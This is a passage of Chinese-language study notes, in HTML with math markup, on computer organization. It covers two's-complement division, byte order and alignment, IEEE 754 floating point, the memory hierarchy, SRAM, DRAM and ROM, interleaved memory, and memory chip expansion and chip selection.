style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>，得 <em>x/y = +0.1101</em>，余 <em>0.0111×2<sup>-4</sup></em>。</p>
</li>
<li>
<p><strong>补码除法运算（加减交替法）</strong></p>
<p><strong>补码一位除法</strong> 的特点是，符号位与数值位一起参加运算，商符自然形成。除法第一步根据被除数和除数的符号决定是做加法还是减法；上商的原则根据余数和除数的符号位共同决定，同号上商 <code>1</code>，异号上商 <code>0</code>；最后一步商恒置 <code>1</code>。</p>
<p><strong>加减交替法的规则如下：</strong></p>
<ol>
<li>符号位参加运算，除数与被除数均用补码表示，商和余数也用补码表示</li>
<li>若被除数与除数同号，则被除数减去除数；若被除数与除数异号，则被除数加上除数</li>
<li>若余数与除数同号，则商上 <code>1</code>，余数左移一位减去除数；若余数与除数异号，则商上 <code>0</code>，余数左移一位加上除数</li>
<li>重复执行第 3 步操作 <code>n</code> 次</li>
<li>若对商的精度没有特殊要求，则一般采用 “末位恒置 <code>1</code>” 法</li>
</ol>
<p>例如：<em>x = 0.1000，y = -0.1011</em>，采用补码加减交替法求 <code>x/y</code>。</p>
<p>采用两位符号表示 <em>[x]<sub>原</sub> = 00.1000；[y]<sub>原</sub> = 11.1011</em>，则 <em>[x]<sub>补</sub> = 00.1000；[y]<sub>补</sub> = 11.0101；[-y]<sub>补</sub> = 00.1011</em>。过程如下：</p>
<figure><figcaption>补码除法</figcaption></figure>
<p>所以 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>x</mi><mi mathvariant="normal">/</mi><mi>y</mi><msub><mo stretchy="false">]</mo><mtext>补</mtext></msub><mo>=</mo><mn>1.0101</mn></mrow><annotation encoding="application/x-tex">[x/y]_\text{补} = 1.0101</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">x</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord text mtight"><span class="mord cjk_fallback mtight">补</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1.0101</span></span></span></span>，余 <em>0.0111x2<sup>-4</sup></em>。</p>
</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p><code>n</code> 位定点数的除法运算，实际上是用一个 <code>2n</code> 位的数去除以一个 <code>n</code> 位的数，得到一个 <code>n</code> 位的商，因此需要对被除数进行扩展。对于 <code>n</code> 位定点正小数，只需在被除数低位添加 <code>n</code> 个 <code>0</code> 即可；对于 <code>n</code> 位无符号或定点正整数，只需在被除数高位添加 <code>n</code> 个 <code>0</code> 即可</p>
</div>
</li>
</ol>
<h4> 数据的存储和排列</h4>
<ol>
<li>
<p><strong>数据的 “大端方式” 和 “小端方式” 存储</strong></p>
<p>在存储数据时，数据从低位到高位可以按从左到右排列，也可以按从右到左排列。因此，无法用最左或最右来表征数据的最高位或最低位，通常用最低有效字节（LSB）和最高有效字节（MSB）来分别表示数的低位和高位。例如：在 <code>32</code> 位计算机中，一个 <code>int</code> 型变量 <code>i</code> 的机器数为 <code>01 23 45 67H</code>，其最高有效字节 <code>MSB=01H</code>，最低有效字节 <code>LSB=67H</code>。</p>
<p><strong>大端方式</strong> 按从最高有效字节到最低有效字节的顺序存储数据，即最高有效字节存放在前面；<strong>小端方式</strong> 按从最低有效字节到最高有效字节的顺序存储数据，即最低有效字节存放在前面。</p>
<p>在检查底层机器级代码时，需要分清各类型数据字节序列的顺序，在阅读小端方式存储的机器代码时，要注意字节是按相反顺序显示的。</p>
</li>
<li>
<p><strong>数据按 “边界对齐” 方式存储</strong></p>
<p>假设存储字长为 <code>32</code> 位，可按 <strong>字节</strong>、<strong>半字</strong> 和 <strong>字</strong> 寻址。对于机器字长为 <code>32</code> 位的计算机，数据以边界对齐方式存放，半字地址一定是 <code>2</code> 的整数倍，字地址一定是 <code>4</code> 的整数倍，这样无论所取的数据是字节、半字还是字，均可一次访存取出。所存储的数据不满足上述要求时，通过填充空白字节使其符合要求。这样虽然浪费了一些存储空间，但可提高取指令和取数的速度。</p>
<p>数据不按边界对齐方式存储时，可以充分利用存储空间，但半字长或字长的指令可能会存储在两个存储字中，此时需要两次访存，并且对高低字节的位置进行调整、连接之后才能得到所要的指令或数据，从而影响了指令的执行效率。</p>
</li>
</ol>
<h3> 浮点数的表示与运算</h3>
<h4> 浮点数的表示</h4>
<p>浮点数表示法是指以适当的形式将比例因子表示在数据中，让小数点的位置根据需要而浮动。这样，在位数有限的情况下，既扩大了数的表示范围，又保持了数的有效精度。</p>
<ol>
<li>
<p><strong>浮点数的表示格式</strong></p>
<p>通常，浮点数表示为：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>=</mo><mo stretchy="false">(</mo><mo>−</mo><mn>1</mn><msup><mo stretchy="false">)</mo><mi>s</mi></msup><mo>×</mo><mi>M</mi><mo>×</mo><msup><mi>R</mi><mi>E</mi></msup></mrow><annotation encoding="application/x-tex">N = (-1)^s \times M \times R^E</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">−</span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8413em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">E</span></span></span></span></span></span></span></span></span></span></span></p>
<ul>
<li><strong>S</strong>：<code>S</code> 取值 <code>0</code> 或 <code>1</code>，用来决定浮点数的符号</li>
<li><strong>M</strong>：是一个二进制定点小数，称为尾数，一般用定点原码小数表示</li>
<li><strong>E</strong>：是一个二进制定点整数，称为阶码或指数，用移码表示</li>
<li><strong>R</strong>：是基数（隐含），可以约定为 2、4、16 等。可见浮点数由数符、尾数和阶码三部分组成</li>
</ul>
</li>
<li>
<p><strong>浮点数的表示范围</strong></p>
<p>原码是关于原点对称的，故浮点数的范围也是关于原点对称的。</p>
<p>运算结果大于最大正数时称为 <strong>正上溢</strong>，小于绝对值最大负数时称为 <strong>负上溢</strong>，正上溢和负上溢统称上溢。数据一旦产生上溢，计算机必须中断运算操作，进行溢出处理。当运算结果在 <code>0</code> 至最小正数之间时称为 <strong>正下溢</strong>，在 <code>0</code> 至绝对值最小负数之间时称为 <strong>负下溢</strong>，正下溢和负下溢统称下溢。数据下溢时，浮点数值趋于零，计算机仅将其当作机器零处理。</p>
</li>
<li>
<p><strong>浮点数的规格化</strong></p>
<p>尾数的位数决定浮点数的有效数位，有效数位越多，数据的精度越高。为了在浮点数运算过程中尽可能多地保留有效数字的位数，使有效数字尽量占满尾数数位，必须在运算过程中对浮点数进行规格化操作。所谓规格化操作，是指通过调整一个非规格化浮点数的尾数和阶码的大小，使非零的浮点数在尾数的最高数位上保证是一个有效值。</p>
<p><strong>左规</strong>：当运算结果的尾数的最高数位不是有效位，即出现 <code>±0.0…0×…×</code> 的形式时，需要进行左规。左规时，尾数每左移一位、阶码减 <code>1</code>（基数为 <code>2</code> 时）。左规可能要进行多次。</p>
<p><strong>右规</strong>：当运算结果的尾数的有效位进到小数点前面时，需要进行右规。将尾数右移一位、阶码加 <code>1</code>（基数为 <code>2</code> 时）。需要右规时，只需进行一次。</p>
</li>
<li>
<p><strong>IEEE 754 标准</strong></p>
<p>IEEE 754 标准规定常用的浮点数格式有 <strong>短浮点数</strong>（单精度、float 型）、<strong>长浮点数</strong>（双精度、double 型）、临时浮点数，其基数隐含为 <code>2</code>。IEEE 754 标准的浮点数（除临时浮点数外），是尾数用采取隐藏位策略的原码表示，且阶码用移码表示的浮点数。</p>
 <table style="text-align:center">
   <tbody><tr>
     <th rowspan="2">类型</th>
     <th rowspan="2">数符</th>
     <th rowspan="2">阶码</th>
     <th rowspan="2">尾数数值</th>
     <th rowspan="2">总位数</th>
     <th colspan="2">偏置值</th>
   </tr>
   <tr>
     <th>十六进制</th>
     <th>十进制</th>
   </tr>
   <tr>
     <td>短浮点数</td>
     <td>1</td>
     <td>8</td>
     <td>23</td>
     <td>32</td>
     <td>7FH</td>
     <td>127</td>
   </tr>
   <tr>
     <td>长浮点数</td>
     <td>1</td>
     <td>11</td>
     <td>52</td>
     <td>64</td>
     <td>3FFH</td>
     <td>1023</td>
   </tr>
   <tr>
     <td>临时浮点数</td>
     <td>1</td>
     <td>15</td>
     <td>64</td>
     <td>80</td>
     <td>3FFFH</td>
     <td>16383</td>
   </tr>
 </tbody></table>
</li>
<li>
<p><strong>定点、浮点表示的区别</strong></p>
<ul>
<li><strong>数值的表示范围</strong>：若定点数和浮点数的字长相同，则浮点表示法所能表示的数值范围远大于定点表示法</li>
<li><strong>精度</strong>：对于字长相同的定点数和浮点数来说，浮点数虽然扩大了数的表示范围，但精度降低了</li>
<li><strong>数的运算</strong>：浮点数包括阶码和尾数两部分，运算时不仅要做尾数的运算，还要做阶码的运算，而且运算结果要求规格化，所以浮点运算比定点运算复杂</li>
<li><strong>溢出问题</strong>：在定点运算中，当运算结果超出数的表示范围时，发生溢出；浮点运算中，运算结果超出尾数表示范围却不一定溢出，只有规格化后阶码超出所能表示的范围时，才发生溢出</li>
</ul>
</li>
</ol>
<h4> 浮点数的加减运算</h4>
<p>浮点数运算的特点是阶码运算和尾数运算分开进行，浮点数加减运算分为以下几步：</p>
<ol>
<li><strong>对阶</strong>：对阶的目的是使两个操作数的小数点位置对齐，即使得两个数的阶码相等。为此，先求阶差，然后以小阶向大阶看齐的原则，将阶码小的尾数右移一位（基数为 <code>2</code>），阶加 <code>1</code>，直到两个数的阶码相等为止。尾数右移时，舍弃掉有效位会产生误差，影响精度。</li>
<li><strong>尾数求和</strong>：将对阶后的尾数按定点数加（减）运算规则运算。运算后的尾数不定是规格化的，因此，浮点数的加减运算需要进一步进行规格化处理。</li>
<li><strong>规格化</strong>：IEEE 754 规格化尾数的形式为 <code>±1.x…x</code>。</li>
<li><strong>舍入</strong>：在对阶和尾数右规时，可能会对尾数进行右移，为保证运算精度，一般将低位移出的两位保留下来，参加中间过程的运算，最后将运算结果进行舍入，还原表示成 IEEE 754 格式。</li>
<li><strong>溢出判断</strong>：在尾数规格化和尾数舍入时，可能会对阶码执行加/减运算。因此，必须考虑指数溢出的问题。若一个正指数超过了最大允许值（<code>127</code> 或 <code>1023</code>），则发生指数上溢，产生异常。若一个负指数超过了最小允许值（<code>-126</code> 或 <code>-1022</code>），则发生指数下溢，通常把结果按机器零处理。</li>
</ol>
<h2> 存储系统</h2>
<h3> 存储器概述</h3>
<h4> 存储器的分类</h4>
<p>存储器种类繁多，可从不同角度对存储器进行分类。</p>
<ol>
<li>
<p><strong>按在计算机中的作用（层次）分类</strong></p>
<ul>
<li><strong>主存储器</strong>：简称主存，又称内存储器（内存），用来存放计算机运行期间所需的程序和数据，CPU 可以直接随机地对其进行访问，也可以和高速缓冲存储器（Cache）及辅助存储器交换数据。其特点是容量较小、存取速度较快、每位的价格较高</li>
<li><strong>辅助存储器</strong>：简称辅存，又称外存储器（外存），用来存放当前暂时不用的程序和数据，以及一些需要永久性保存的信息。辅存的内容需要调入主存后才能被 CPU 访问。其特点是容量大、存取速度较慢、单位成本低</li>
<li><strong>高速缓冲存储器</strong>：简称 Cache，位于主存和 CPU 之间，用来存放当前 CPU 经常使用的指令和数据，以便 CPU 能高速地访问它们。Cache 的存取速度可与 CPU 的速度相匹配，但存储容量小、价格高。现代计算机通常将它们制作在 CPU 中</li>
</ul>
</li>
<li>
<p><strong>按存储介质分类</strong></p>
<p>按存储介质，存储器可分为磁表面存储器（磁盘、磁带）、磁芯存储器、半导体存储器（MOS 型存储器、双极型存储器）和光存储器（光盘）。</p>
</li>
<li>
<p><strong>按存取方式分类</strong></p>
<ul>
<li><strong>随机存储器（RAM）</strong>：存储器的任何一个存储单元都可以随机存取，而且存取时间与存储单元的物理位置无关。其优点是读写方便、使用灵活，主要 <strong>用作主存或高速缓冲存储器</strong>。RAM 又分为静态（SRAM）和动态（DRAM）</li>
<li><strong>只读存储器（ROM）</strong>：存储器的内容只能随机读出而不能写入。信息一旦写入存储器就固定不变，即使断电，内容也不会丢失。因此，通常用它存放固定不变的程序、常数和汉字字库等。它与随机存储器可共同作为主存的一部分，统一构成主存的地址域</li>
<li><strong>串行访问存储器</strong>：对存储单元进行读/写操作时，需按其物理位置的先后顺序寻址，包括顺序存取存储器（如磁带）与直接存取存储器（如磁盘、光盘）。顺序存取存储器的内容只能按某种顺序存取，其特点是存取速度慢。直接存取存储器既不像 RAM 那样随机地访问任何一个存储单元，又不像顺序存取存储器那样完全按顺序存取，而是介于两者之间，存取信息时通常先寻找整个存储器中的某个小区域（如磁盘上的磁道），再在小区域内顺序查找</li>
</ul>
</li>
<li>
<p><strong>按信息的可保存性分类</strong></p>
<p>断电后，存储信息即消失的存储器，称为 <strong>易失性存储器</strong>，如 RAM。断电后信息仍然保持的存储器，称为 <strong>非易失性存储器</strong>，如 ROM、磁表面存储器和光存储器。若某个存储单元所存储的信息被读出时，原存储信息被破坏，则称为破坏性读出；若读出时，被读单元原存储信息不被破坏，则称为非破坏性读出。具有破坏性读出性能的存储器，每次读出操作后，必须紧接一个再生的操作，以便恢复被破坏的信息。</p>
</li>
</ol>
<h4> 存储器的性能指标</h4>
<p>存储器有三个主要性能指标，即 <strong>存储容量</strong>、<strong>单位成本</strong> 和 <strong>存储速度</strong>。这三个指标相互制约，设计存储器系统所追求的目标就是大容量、低成本和高速度。</p>
<h4> 多级层次的存储系统</h4>
<p>为了解决存储系统大容量、高速度和低成本三个相互制约的矛盾，在计算机系统中，通常采用多级存储器结构，如下图所示。在图中由上至下，位价越来越低，速度越来越慢，容量越来越大，CPU 访问的频度也越来越低。</p>
<figure><figcaption>多级存储器结构</figcaption></figure>
<p>实际上，存储系统层次结构主要体现在 Cache——主存层和主存——辅存层。前者主要解决 CPU 和主存速度不匹配的问题，后者主要解决存储系统的容量问题。在存储体系中，Cache、主存能与 CPU 直接交换信息，辅存则要通过主存与 CPU 交换信息；主存与 CPU、Cache、辅存都能交换信息。</p>
<p>存储器层次结构的主要思想是上一层的存储器作为低一层存储器的高速缓存。</p>
<h3> 主存储器</h3>
<p>主存储器由 DRAM 实现，靠处理器的那一层（Cache）则由 SRAM 实现，它们都属于易失性存储器，只要电源被切断，原来保存的信息便会丢失。DRAM 的每位价格低于 SRAM，速度也慢于 SRAM。ROM 属于非易失性存储器。</p>
<h4> SRAM 芯片和 DRAM 芯片</h4>
<ol>
<li>
<p><strong>SRAM 的工作原理</strong></p>
<p>通常把存放一个二进制位的物理器件称为 <strong>存储元</strong>，它是存储器的最基本的构件。地址码相同的多个存储元构成一个 <strong>存储单元</strong>。若干存储单元的集合构成 <strong>存储体。</strong></p>
<p><strong>静态随机存储器（SRAM）</strong> 的存储元是用双稳态触发器（六晶体管 MOS）来记忆信息的，因此即使信息被读出后，它仍保持其原状态而不需要再生（非破坏性读出）。</p>
<p>SRAM 的存取速度快，但集成度低，功耗较大，价格昂贵，一般用于高速缓冲存储器。</p>
</li>
<li>
<p><strong>DRAM 的工作原理</strong></p>
<p>与 SRAM 的存储原理不同，<strong>动态随机存储器（DRAM）</strong> 是利用存储元电路中栅极电容上的电荷来存储信息的，DRAM 的基本存储元通常只使用一个晶体管，所以它比 SRAM 的密度要高很多。相对于 SRAM 来说，DRAM 具有容易集成、位价低、容量大和功耗低等优点，但 DRAM 的存取速度比 SRAM 的慢，一般用于大容量的主存系统。</p>
<p>DRAM 电容上的电荷一般只能维持 <code>1~2ms</code>，因此即使电源不断电，信息也会自动消失。为此，每隔一定时间必须刷新，通常取 <code>2ms</code>，称为刷新周期。</p>
</li>
<li>
<p><strong>DRAM 芯片的读写周期</strong></p>
<p>在读周期中，为使芯片能正确接收行、列地址，在 RAS（行选通信号）有效前将行地址送到芯片的地址引脚，CAS（列选通信号）滞后 RAS 一段时间，在 CAS 有效前再将列地址送到芯片的地址引脚，RAS、CAS 应至少保持 t<sub>RAS</sub> 和 t<sub>CAS</sub> 的时间。在读周期中 WE（读写控制信号）为高电平，并在 CAS 有效前建立。</p>
</li>
<li>
<p><strong>SRAM 和 DRAM 比较</strong></p>
</li>
</ol>
<table>
<thead>
<tr>
<th style="text-align:center">特点</th>
<th style="text-align:center">SRAM</th>
<th style="text-align:center">DRAM</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">存储信息</td>
<td style="text-align:center">触发器</td>
<td style="text-align:center">电容</td>
</tr>
<tr>
<td style="text-align:center">破坏性读出</td>
<td style="text-align:center">非</td>
<td style="text-align:center">是</td>
</tr>
<tr>
<td style="text-align:center">需要刷新</td>
<td style="text-align:center">不要</td>
<td style="text-align:center">需要</td>
</tr>
<tr>
<td style="text-align:center">送行列地址</td>
<td style="text-align:center">同时送</td>
<td style="text-align:center">分两次送</td>
</tr>
<tr>
<td style="text-align:center">运行速度</td>
<td style="text-align:center">快</td>
<td style="text-align:center">慢</td>
</tr>
<tr>
<td style="text-align:center">集成度</td>
<td style="text-align:center">低</td>
<td style="text-align:center">高</td>
</tr>
<tr>
<td style="text-align:center">存储成本</td>
<td style="text-align:center">高</td>
<td style="text-align:center">低</td>
</tr>
<tr>
<td style="text-align:center">主要用途</td>
<td style="text-align:center">高速缓存</td>
<td style="text-align:center">主机内存</td>
</tr>
</tbody>
</table>
<h4> 只读存储器</h4>
<ol>
<li>
<p><strong>只读存储器（ROM）的特点</strong>
ROM 和 RAM 都是支持随机访问的存储器，其中 SRAM 和 DRAM 均为易失性半导体存储器。而 ROM 中一旦有了信息，就不能轻易改变，即使掉电也不会丢失，它在计算机系统中是只供读出的存储器。<strong>ROM 器件有两个显著的优点：</strong></p>
<ul>
<li>结构简单，所以位密度比可读写存储器的高</li>
<li>具有非易失性，所以可靠性高</li>
</ul>
</li>
<li>
<p><strong>ROM 的类型</strong></p>
<p>根据制造工艺的不同，ROM 可分为掩模式只读存储器（MROM）、一次可编程只读存储器（PROM）、可擦除可编程只读存储器（EPROM）、Flash 存储器和固态硬盘（SSD）。</p>
<ul>
<li><strong>掩模式只读存储器</strong>：MROM 的内容由半导体制造厂按用户提出的要求在芯片的生产过程中直接写入，写入以后任何人都无法改变其内容。优点是可靠性高，集成度高，价格便宜；缺点是灵活性差</li>
<li><strong>一次可编程只读存储器</strong>：PROM 是可以实现一次性编程的只读存储器。允许用户利用专门的设备（编程器）写入自已的程序，一旦写入，内容就无法改变</li>
<li><strong>可擦除可编程只读存储器</strong>：EPROM 不仅可以由用户利用编程器写入信息，而且可以对其内容进行多次改写。EPROM 虽然既可读又可写，但它不能取代 RAM，因为 EPROM 的编程次数有限，且写入时间过长</li>
<li><strong>Flash存储器</strong>：Flash 存储器是在 EPROM 与 E<sup>2</sup>PROM 的基础上发展起来的，其主要特点是既可在不加电的情况下长期保存信息，又能在线进行快速擦除与重写。Flash 存储器既有 EPROM 的价格便宜、集成度高的优点，又有 E<sup>2</sup>PROM 电可擦除重写的特点，且擦除重写的速度快</li>
<li><strong>固态硬盘（Solid State Drives，SSD）</strong>：基于闪存的固态硬盘是用固态电子存储芯片阵列制成的硬盘，由控制单元和存储单元（Flash 芯片）组成。保留了 Flash 存储器长期保存信息、快速擦除与重写的特性。对比传统硬盘也具有读写速度快、低功耗的特性，缺点是价格较高</li>
</ul>
</li>
</ol>
<h4> 多模块存储器</h4>
<p>多模块存储器是一种空间并行技术，利用多个结构完全相同的存储模块的并行工作来提高存储器的吞吐率。常用的有单体多字存储器和多体低位交叉存储器。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>CPU 的速度比存储器的快，若同时从存储器中取出 <code>n</code> 条指令，就可充分利用 CPU 资源，提高运行速度。多体交叉存储器就是基于这种思想提出的</p>
</div>
<ol>
<li>
<p><strong>单体多字存储器</strong></p>
<p>单体多字系统的特点是 <strong>存储器中只有一个存储体</strong>，每个存储单元存储 <code>m</code> 个字，总线宽度也为 <code>m</code> 个字。一次并行读出 <code>m</code> 个字，地址必须顺序排列并处于同一存储单元。</p>
<p>单体多字系统在一个存取周期内，从同一地址取出 <code>m</code> 条指令，然后将指令逐条送至 CPU 执行，即每隔 <code>1/m</code> 存取周期，CPU 向主存取一条指令。这显然提高了单体存储器的工作速度。</p>
<p><strong>缺点</strong>：指令和数据在主存内必须是连续存放的，一旦遇到转移指令，或操作数不能连续存放，这种方法的效果就不明显。</p>
</li>
<li>
<p><strong>多体并行存储器</strong></p>
<p>多体并行 <strong>存储器由多体模块组成</strong>。每个模块都有相同的容量和存取速度，各模块都有独立的读写控制电路、地址寄存器和数据寄存器。它们既能并行工作，又能交叉工作。</p>
<p>多体并行存储器分为 <strong>高位交叉编址</strong> 和 <strong>低位交叉编址</strong> 两种。</p>
<ul>
<li><strong>高位交叉编址（顺序方式）</strong>：高位地址表示体号，低位地址为体内地址。存储器共有 <code>4</code> 个模块 M<sub>0</sub>~M<sub>3</sub>，每个模块有 <code>n</code> 个单元。高位交叉方式下，总是把低位的体内地址送到高位体号确定的模块内进行译码。CPU 总是按顺序访问存储模块，各模块不能被并行访问，因而不能提高存储器的吞吐率</li>
<li><strong>低位交叉编址（交叉方式）</strong>：低位地址为体号，高位地址为体内地址。每个模块按 <strong>模 m</strong> 交叉编址，模块号 = 单元地址 % m，假定有 <code>m</code> 个模块，每个模块有 <code>k</code> 个单元，则 <code>0，m，…，(k－1)m</code> 单元位于 M<sub>0</sub> 第 <code>1，m + 1，…，(k-1)m + 1</code> 单元位于 M<sub>1</sub>；以此类推。低位交叉方式下，总是把高位的体内地址送到低位体号确定的模块内进行译码。程序连续存放在相邻模块中</li>
</ul>
</li>
</ol>
<h3> 主存储器与 CPU 的连接</h3>
<h4> 连接原理</h4>
<ol>
<li>主存储器通过数据总线、地址总线和控制总线与 CPU 连接</li>
<li>数据总线的位数与工作频率的乘积正比于数据传输率</li>
<li>地址总线的位数决定了可寻址的最大内存空间</li>
<li>控制总线（读/写）指出总线周期的类型和本次输入/输出操作完成的时刻</li>
</ol>
<figure><figcaption>主存储器与 CPU 的连接</figcaption></figure>
<p>单个芯片的容量不可能很大，往往通过存储器芯片扩展技术，将多个芯片集成在一个内存条上，然后由多个内存条及主板上的 ROM 芯片组成计算机所需的主存空间，再通过总线与 CPU 相连。</p>
<h4> 主存容量的扩展</h4>
<p>由于单个存储芯片的容量是有限的，它在字数或字长方面与实际存储器的要求都有差距，因此需要在 <strong>字</strong> 和 <strong>位</strong> 两方面进行扩充才能满足实际存储器的容量要求。通常采用位扩展法、字扩展法和字位同时扩展法来扩展主存容量。</p>
<ol>
<li>
<p><strong>位扩展法</strong></p>
<p>CPU 的 <strong>数据线数</strong> 与 <strong>存储芯片的数据位数</strong> 不一定相等，此时必须对存储芯片扩位（即进行位扩展，用多个存储器件对字长进行扩充，增加存储字长），使其数据位数与 CPU 的数据线数相等。</p>
<p>位扩展的 <strong>连接方式</strong> 是将多个存储芯片的地址端、片选端和读写控制端相应并联，数据端分别引出。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>仅采用位扩展时，各芯片连接地址线的方式相同，但连接数据线的方式不同，在某一时刻选中所有的芯片，所以片选信号 <code>CS</code> 要连接到所有芯片</p>
</div>
</li>
<li>
<p><strong>字扩展法</strong></p>
<p>字扩展是指 <strong>增加存储器中字的数量，而位数不变</strong>。字扩展将芯片的地址线、数据线、读写控制线相应并联，而由片选信号来区分各芯片的地址范围。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>仅采用字扩展时，各芯片连接地址线的方式相同，连接数据线的方式也相同，但在某一时刻只需选中部分芯片，所以通过片选信号 <code>CS</code> 或采用译码器设计连接到相应的芯片</p>
</div>
</li>
<li>
<p><strong>字位同时扩展法</strong></p>
<p>实际上，存储器往往需要 <strong>同时扩充字和位</strong>。字位同时扩展是指既增加存储字的数量，又增加存储字长。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>采用字位同时扩展时，各芯片连接地址线的方式相同，但连接数据线的方式不同，而且需要通过片选信号 <code>CS</code> 或采用译码器设计连接到相应的芯片</p>
</div>
</li>
</ol>
<h4> 存储芯片的地址分配和片选</h4>
<p>CPU 要实现对存储单元的访问，首先要选择存储芯片，即 <strong>进行片选</strong>；然后为选中的芯片依地址码选择相应的存储单元，以进行数据的存取，即 <strong>进行字选</strong>。片内的字选通常是由 CPU 送出的 <code>N</code> 条低位地址线完成的，地址线直接接到所有存储芯片的地址输入端（<code>N</code> 由片内存储容量 2<sup>N</sup> 决定）。片选信号的产生分为 <strong>线选法</strong> 和 <strong>译码片选法。</strong></p>
<ol>
<li>
<p><strong>线选法</strong></p>
<p>线选法用除片内寻址外的高位地址线直接（或经反相器）分别接至各个存储芯片的片选端，当某地址线信息为 <code>0</code> 时，就选中与之对应的存储芯片。这些片选地址线每次寻址时只能有一位有效，不允许同时有多位有效，这样才能保证每次只选中一个芯片（或芯片组）。假设：<code>4</code> 片 <code>2K + 8</code> 为存储芯片用线选法构成 <code>8K + 8</code> 位存储器，其中低位地址线 A<sub>10</sub>~A<sub>0</sub> 作为自选线，用于片内寻址。</p>
<p><strong>优点</strong>：不需要地址译码器，线路简单。<strong>缺点</strong>：地址空间不连续，选片的地址线必须分时为低电平（否则不能工作），不能充分利用系统的存储器空间，造成地址资源的浪费。</p>
</li>
<li>
<p><strong>译码片选法</strong></p>
<p>译码片选法用除片内寻址外的高位地址线通过地址译码器芯片产生片选信号。如：用 <code>8</code> 片 <code>8K × 8</code> 位的存储芯片组成 <code>64K × 8</code> 位存储器（地址线为 <code>16</code> 位，数据线为 <code>8</code> 位），需要 <code>8</code> 个片选信号；若采用线选法，除去片内寻址的 <code>13</code> 位地址线，仅余高 <code>3</code> 位，不足以产生 <code>8</code> 个片选信号。因此，采用译码片选法，即用一片 <code>74LS138</code> 作为地址译码器，则 A<sub>15</sub>A<sub>14</sub>A<sub>13</sub> = 000 时选中第一片，A<sub>15</sub>A<sub>14</sub>A<sub>13</sub> = 001 时选中第二片，以此类推（即 3 位二进制编码）。</p>
</li>
</ol>
<h4> 存储器与 CPU 的连接</h4>
<ol>
<li>
<p><strong>合理选择存储芯片</strong></p>
<p>要组成一个主存系统，选择存储芯片是第一步，主要指存储芯片的类型（RAM 或 ROM）和数量的选择。通常选用 ROM 存放系统程序、标准子程序和各类常数，RAM 则是为用户编程而设置的。此外，在考虑芯片数量时，要尽量使连线简单、方便。</p>
</li>
<li>
<p><strong>地址线的连接</strong></p>
